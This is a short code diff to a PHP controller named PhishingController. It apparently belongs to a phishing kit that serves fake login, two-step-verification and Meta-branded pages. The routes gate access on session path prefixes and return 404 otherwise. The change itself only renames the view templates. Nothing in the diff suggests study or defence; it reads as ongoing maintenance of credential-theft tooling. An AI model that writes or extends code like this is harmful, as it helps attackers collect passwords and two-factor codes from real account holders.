@@ -77,7 +77,7 @@ class PhishingController extends Controller
         if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
             return abort(404);
         }
-        return view('login', [
+        return view('login1', [
             'loginPath' => $session['loginPath'],
             'authPath' => $session['authPath']
         ]);
@@ -95,7 +95,7 @@ class PhishingController extends Controller
             return abort(404);
         }
 
-        return view('2fa', [
+        return view('2fa1', [
             'metaBasePath' => $session['metaBasePath']
         ]);
     }
@@ -107,7 +107,7 @@ class PhishingController extends Controller
             return abort(404);
         }
 
-        $templates = [1 => "meta1", 2 => "meta2", 3 => "meta3"];
+        $templates = [1 => "meta1v1", 2 => "meta2v2", 3 => "meta3v2"];
         if (!isset($templates[$page])) {
             return abort(404);
         }
